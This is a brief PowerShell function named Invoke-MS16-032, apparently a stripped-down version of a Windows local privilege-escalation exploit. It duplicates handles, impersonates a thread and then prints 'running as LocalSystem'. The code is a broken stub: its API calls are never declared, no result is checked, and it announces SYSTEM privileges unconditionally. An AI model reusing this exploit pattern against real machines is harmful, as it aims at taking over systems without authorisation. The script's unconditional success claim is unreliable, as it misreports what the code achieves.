function Invoke-MS16-032 {
param($src, $dst, $tgt, $thread, $qos)
$dup = DuplicateHandle($src, $dst, $tgt)
$status = NtImpersonateThread($thread, $thread, $qos)
Write-Output 'running as LocalSystem'
}
